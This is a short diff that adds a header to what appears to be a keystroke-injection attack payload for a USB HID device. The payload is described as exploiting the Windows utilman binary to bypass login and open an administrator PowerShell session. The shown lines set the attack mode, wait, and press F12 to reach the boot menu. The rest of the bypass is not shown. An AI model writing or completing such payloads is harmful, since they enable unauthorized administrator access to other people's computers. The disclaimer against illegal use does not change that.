@@ -1,3 +1,8 @@
+REM Authentication Bypass Script for Windows 
+REM AUTHOR Crashwire
+REM DESCRIPTION: Exploits the utilman binary to bypass user authentication and grant user an administrator powershell session
+REM **DO NOT USE FOR ILLEGAL PURPOSES**
+ATTACKMODE HID STORAGE
 DELAY 1000
 REM Press F12 to enter boot menu (timing may need to be adjusted)
 F12
